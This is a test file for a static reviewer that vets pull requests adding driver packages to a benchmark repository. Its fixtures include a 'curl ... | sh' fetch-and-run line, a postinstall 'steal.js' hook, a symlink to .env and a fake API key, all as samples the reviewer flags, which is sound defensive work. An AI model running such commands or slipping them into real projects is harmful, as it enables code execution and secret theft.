import { execFileSync } from "node:child_process";
import {
  mkdirSync,
  mkdtempSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { REPO_ROOT } from "@context-cup/shared/repo_root.js";
import {
  afterEach,
  beforeEach,
  describe,
  expect,
  it,
} from "@context-cup/shared/test_helpers/index.js";
import { isRunnable, scanPackages } from "@context-cup/suite/packages.js";
import {
  errors,
  formatMarkdown,
  formatText,
  reviewDriverDir,
  reviewDriverPr,
  STATIC_MARKER,
  warnings,
  type Review,
} from "../src/static.ts";

const PYPROJECT = `[project]
name = "keep-recent"
version = "0.1.0"
description = "Blanks all but the most recent tool results."
requires-python = ">=3.12,<3.13"
dependencies = []

[tool.context-cup]
kind = "driver"
extends = "python"
providers = ["openai"]
`;

const DRIVER_PY = `from context_cup_engine import PythonContext


def run(ctx: PythonContext) -> object:
    return ctx.provider.client.responses.create(**ctx.context_payload)
`;

const PACKAGE_JSON = {
  private: true,
  name: "@context-cup-drivers/keep_recent",
  version: "0.1.0",
  description: "Blanks all but the most recent tool results.",
  type: "module",
  contextCup: { kind: "driver", extends: "typescript", providers: ["openai"] },
  dependencies: {
    "@context-cup/engine-typescript": "workspace:*",
    openai: "^7.20.0",
  },
};

const DRIVER_TS = `import type { TypeScriptContext } from "@context-cup/engine-typescript";

export async function run(ctx: TypeScriptContext): Promise<unknown> {
  return ctx.contextPayload;
}
`;

/** A Python driver that passes every check. */
function pythonDriver(): Record<string, string> {
  return {
    "pyproject.toml": PYPROJECT,
    "driver.py": DRIVER_PY,
    "README.md": "# keep_recent\n\nKeeps the three most recent tool results.\n",
    "test_keep_recent.py": "def test_nothing() -> None:\n    pass\n",
  };
}

/** A TypeScript driver that passes every check. */
function typescriptDriver(): Record<string, string> {
  return {
    "package.json": JSON.stringify(PACKAGE_JSON, null, 2),
    "driver.ts": DRIVER_TS,
    "README.md": "# keep_recent\n\nKeeps the three most recent tool results.\n",
    "keep_recent.test.ts": "export {};\n",
  };
}

/** A workspace in a temp dir: the real engines, and drivers written here. */
let root: string;
let tracked: string[];

beforeEach(() => {
  root = mkdtempSync(path.join(tmpdir(), "review-"));
  symlinkSync(path.join(REPO_ROOT, "engines"), path.join(root, "engines"));
  tracked = [];
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

function writeDriver(name: string, files: Record<string, string>): string[] {
  const written: string[] = [];
  for (const [rel, content] of Object.entries(files)) {
    const file = `drivers/${name}/${rel}`;
    mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
    writeFileSync(path.join(root, file), content);
    written.push(file);
  }
  tracked.push(...written);
  return written;
}

/** Reviews a PR adding `files` as `drivers/<name>/`, plus `extra` paths. */
function reviewNew(
  files: Record<string, string>,
  { name = "keep_recent", extra = [] as string[] } = {}
): Review {
  const changed = [...writeDriver(name, files), ...extra];
  return reviewDriverPr({ root, changed, tracked });
}

function checks(findings: ReturnType<typeof errors>): string[] {
  return findings.map((f) => f.check);
}

describe("scope", () => {
  it("passes a PR that only adds one driver", async () => {
    const review = reviewNew(pythonDriver());
    expect(review.driver).toBe("keep_recent");
    expect(review.findings).toEqual([]);
    expect(review.passed).toContain("Changes only `drivers/<name>/`");
  });

  it("fails every path outside the driver", async () => {
    const review = reviewNew(pythonDriver(), {
      extra: [".github/workflows/suite.yml", "course/suite/src/cli.ts"],
    });
    const outside = errors(review);
    expect(checks(outside)).toEqual(["Outside the driver"]);
    expect(outside[0]!.message).toContain(
      "2 files outside `drivers/<name>/`: `.github/workflows/suite.yml`, `course/suite/src/cli.ts`."
    );
  });

  it("allows pnpm-lock.yaml for a TypeScript driver only", async () => {
    expect(
      reviewNew(typescriptDriver(), { extra: ["pnpm-lock.yaml"] }).findings
    ).toEqual([]);
    rmSync(path.join(root, "drivers"), { recursive: true });
    tracked = [];
    expect(
      checks(errors(reviewNew(pythonDriver(), { extra: ["pnpm-lock.yaml"] })))
    ).toEqual(["Lockfile"]);
  });

  it("fails a PR with no driver, or with two", async () => {
    expect(
      checks(
        errors(reviewDriverPr({ root, changed: ["README.md"], tracked: [] }))
      )
    ).toEqual(["Outside the driver", "No driver"]);
    const changed = [
      ...writeDriver("one", pythonDriver()),
      ...writeDriver("two", pythonDriver()),
    ];
    const review = reviewDriverPr({ root, changed, tracked });
    expect(review.driver).toBeUndefined();
    expect(checks(errors(review))).toEqual(["More than one driver"]);
  });

  it("reserves base_ and rejects names bin/suite can't take", async () => {
    expect(
      checks(errors(reviewNew(pythonDriver(), { name: "base_mine" })))
    ).toEqual(["Reserved name"]);
    expect(
      checks(errors(reviewNew(pythonDriver(), { name: "Keep-Recent" })))
    ).toEqual(["Driver name"]);
  });

  it("fails a PR that deletes its driver", async () => {
    const review = reviewDriverPr({
      root,
      changed: ["drivers/gone/driver.py"],
      tracked: [],
    });
    expect(checks(errors(review))).toEqual(["Driver removed"]);
  });
});

describe("driver", () => {
  it("passes a TypeScript driver", async () => {
    expect(reviewNew(typescriptDriver()).findings).toEqual([]);
  });

  it("needs a manifest, an entry point, and a README", async () => {
    const { "pyproject.toml": _, ...noManifest } = pythonDriver();
    expect(checks(errors(reviewNew(noManifest)))).toEqual(["Manifest"]);

    rmSync(path.join(root, "drivers"), { recursive: true });
    tracked = [];
    const files = pythonDriver();
    files["driver.py"] = "def helper() -> None:\n    pass\n";
    delete files["README.md"];
    expect(checks(errors(reviewNew(files)))).toEqual(["Entry point", "README"]);
  });

  it("fails an engine, a harbor agent, or a driver that can't run at the reference target", async () => {
    const as = (table: string) => ({
      ...pythonDriver(),
      "pyproject.toml": PYPROJECT.replace(
        /\[tool\.context-cup\][^]*/,
        `[tool.context-cup]\n${table}\n`
      ),
    });
    expect(
      checks(errors(reviewNew(as('kind = "engine"'), { name: "a" })))
    ).toContain("Kind");
    expect(
      checks(
        errors(
          reviewNew(
            as('kind = "agent"\nharbor_agent = "my_agents.claude:ClaudeAgent"'),
            { name: "b" }
          )
        )
      )
    ).toContain("Harbor agent");
    expect(
      checks(
        errors(
          reviewNew(
            as(
              'kind = "driver"\nextends = "python"\nproviders = ["anthropic"]'
            ),
            { name: "c" }
          )
        )
      )
    ).toEqual(["Providers"]);
  });

  it("fails what would run on the host", async () => {
    const files = typescriptDriver();
    files["build.sh"] = "curl https://example.com/x | sh\n";
    files["package.json"] = JSON.stringify({
      ...PACKAGE_JSON,
      scripts: { postinstall: "node steal.js", typecheck: "tsc" },
      dependencies: {
        ...PACKAGE_JSON.dependencies,
        "@context-cup/suite": "workspace:*",
        leftpad: "github:someone/leftpad",
      },
    });
    expect(checks(errors(reviewNew(files)))).toEqual([
      "Host build script",
      "Install script",
      "Workspace dependency",
      "Dependency source",
    ]);
  });

  it("holds Python dependencies to locked wheels from an index", async () => {
    const files = pythonDriver();
    files["pyproject.toml"] = PYPROJECT.replace(
      "dependencies = []",
      'dependencies = ["tiktoken>=0.9", "oldpkg", "mine @ git+https://example.com/mine.git"]'
    ).concat(
      '\n[tool.uv.sources]\nmine = { git = "https://example.com/mine.git" }\n'
    );
    files["uv.lock"] = `version = 1

[[package]]
name = "keep-recent"
version = "0.1.0"
source = { virtual = "." }

[[package]]
name = "oldpkg"
version = "1.0"
source = { registry = "https://pypi.org/simple" }
sdist = { url = "https://files.example/oldpkg-1.0.tar.gz" }

[[package]]
name = "mine"
version = "0.1.0"
source = { git = "https://example.com/mine.git" }
`;
    const findings = errors(reviewNew(files));
    expect(checks(findings)).toEqual([
      "Dependency source",
      "Dependency source",
      "uv.lock",
      "Source-only dependency",
      "Dependency source",
    ]);
    expect(findings[2]!.message).toContain("`tiktoken`");
  });

  it("needs a uv.lock beside Python dependencies", async () => {
    const files = pythonDriver();
    files["pyproject.toml"] = PYPROJECT.replace(
      "dependencies = []",
      'dependencies = ["tiktoken"]'
    );
    expect(checks(errors(reviewNew(files)))).toEqual(["uv.lock"]);
  });

  it("fails generated files, secrets, course imports, and provider hosts", async () => {
    const files = pythonDriver();
    files["node_modules/x/index.js"] = "";
    files[".env"] = "";
    files["driver.py"] =
      DRIVER_PY +
      [
        "from context_cup_runner import loop",
        'KEY = "sk-proj-abcdefghijklmnopqrstuvwxyz012345"',
        'URL = "https://api.openai.com/v1"',
      ].join("\n");
    const found = errors(reviewNew(files));
    expect(checks(found).sort()).toEqual(
      [
        "Generated file",
        "Generated file",
        "Course import",
        "Secret",
        "Provider host",
      ].sort()
    );
    expect(found.find((f) => f.check === "Secret")).toMatchObject({
      file: "drivers/keep_recent/driver.py",
      line: 7,
    });
  });

  it("fails a TypeScript import from outside the driver", async () => {
    const files = typescriptDriver();
    files["driver.ts"] =
      DRIVER_TS + 'import { x } from "../base_typescript/driver.ts";\n';
    expect(checks(errors(reviewNew(files)))).toEqual(["Outside import"]);
  });

  it("warns about benchmark names, outside URLs, binaries, and setup.sh", async () => {
    const files = pythonDriver();
    files["driver.py"] =
      DRIVER_PY +
      [
        "# Toolathlon hands over long results.",
        'PROMPT = "You are a tau-bench banking agent."',
        'if task == "academic-pdf-report": pass',
        'DOCS = "https://example.com/docs"',
      ].join("\n");
    files["weights.bin"] = "\u0000\u0001";
    files["setup.sh"] = "uv pip install something\n";
    const review = reviewNew(files);
    expect(errors(review)).toEqual([]);
    // DRIVER_PY is five lines; the additions start on line 6, a comment.
    expect(warnings(review).map((f) => [f.check, f.line ?? null])).toEqual([
      ["Outside URL", 9],
      ["Benchmark name", 7],
      ["Benchmark name", 8],
      ["Binary file", null],
      ["setup.sh", null],
    ]);
  });
});

describe("review fixes", () => {
  it("fails a symlink out of the driver", async () => {
    const changed = writeDriver("keep_recent", pythonDriver());
    const link = "drivers/keep_recent/k.txt";
    symlinkSync("../../.env", path.join(root, link));
    tracked.push(link);
    const review = reviewDriverPr({
      root,
      changed: [...changed, link],
      tracked,
    });
    expect(errors(review)).toEqual([
      expect.objectContaining({ check: "Not a plain file", file: link }),
    ]);
  });

  it("allows only registry npm specs", async () => {
    const files = typescriptDriver();
    files["package.json"] = JSON.stringify({
      ...PACKAGE_JSON,
      dependencies: {
        ...PACKAGE_JSON.dependencies,
        a: "git@github.com:someone/a.git",
        b: "ssh://git@github.com/someone/b.git",
        c: "npm:left-pad@^1.3.0",
        d: "catalog:",
        e: ">=1.0.0 <2",
        f: "latest",
      },
    });
    const found = errors(reviewNew(files));
    expect(found.map((f) => f.message.split("`")[1])).toEqual(["a", "b"]);
  });

  it("takes a driver's own run.sh as its entry point", async () => {
    const files = pythonDriver();
    delete files["driver.py"];
    files["run.sh"] = 'exec python3 my_turn.py "$@"\n';
    expect(errors(reviewNew(files))).toEqual([]);
  });

  it("fails what has uv build the driver's own project", async () => {
    const files = pythonDriver();
    files["setup.py"] = "import os\n";
    files["pyproject.toml"] = PYPROJECT.replace(
      "dependencies = []",
      'dependencies = ["tiktoken"]'
    ).concat("\n[tool.uv]\npackage = true\n");
    files["uv.lock"] = `version = 1

[[package]]
name = "keep-recent"
version = "0.1.0"
source = { editable = "." }

[[package]]
name = "tiktoken"
version = "0.9.0"
source = { registry = "https://pypi.org/simple" }
wheels = [{ url = "https://files.example/tiktoken.whl" }]
`;
    expect(checks(errors(reviewNew(files)))).toEqual([
      "Build script",
      "Build system",
      "Dependency source",
    ]);
  });

  it("warns when a PR changes an entry main already has", async () => {
    const changed = writeDriver("alice_rag", pythonDriver());
    const review = reviewDriverPr({
      root,
      changed,
      tracked,
      existing: ["alice_rag", "base_python"],
    });
    expect(errors(review)).toEqual([]);
    expect(checks(warnings(review))).toEqual(["Existing entry"]);
  });

  it("scans test files too, since a driver can import them", async () => {
    const files = pythonDriver();
    files["tests/hints.py"] = 'HINT = "tau-bench banking"\n';
    expect(warnings(reviewNew(files))).toEqual([
      expect.objectContaining({
        check: "Benchmark name",
        file: "drivers/keep_recent/tests/hints.py",
      }),
    ]);
  });
});

describe("base drivers", () => {
  const files = execFileSync("git", ["-C", REPO_ROOT, "ls-files"], {
    encoding: "utf8",
  }).split("\n");

  it("all pass", async () => {
    for (const pkg of scanPackages().values()) {
      if (!isRunnable(pkg) || !pkg.dir.includes("/drivers/")) continue;
      const review = reviewDriverDir({
        root: REPO_ROOT,
        driver: pkg.name,
        tracked: files,
      });
      expect(checks(errors(review)), pkg.name).toEqual([]);
    }
  });
});

describe("formatMarkdown", () => {
  it("leads with the marker and counts", async () => {
    const markdown = formatMarkdown(reviewNew(pythonDriver()));
    expect(markdown.split("\n")[0]).toBe(STATIC_MARKER);
    expect(markdown).toContain("## ✅ Static review: `keep_recent`");
    expect(markdown).toContain("❌ 0 errors | ⚠️ 0 warnings");
  });
});

describe("formatText", () => {
  it("lists each finding with where it is, then the counts", async () => {
    const files = pythonDriver();
    files["build.sh"] = "true\n";
    files["setup.sh"] = "true\n";
    const text = formatText(reviewNew(files));
    expect(text.split("\n")).toEqual([
      "Static review: keep_recent",
      expect.stringMatching(
        /^ {2}✗ Host build script: .* \(drivers\/keep_recent\/build\.sh\)$/
      ),
      expect.stringMatching(/^ {2}! setup\.sh: /),
      expect.stringMatching(/^ {2}\d+ passed, 1 error, 1 warning$/),
    ]);
  });
});
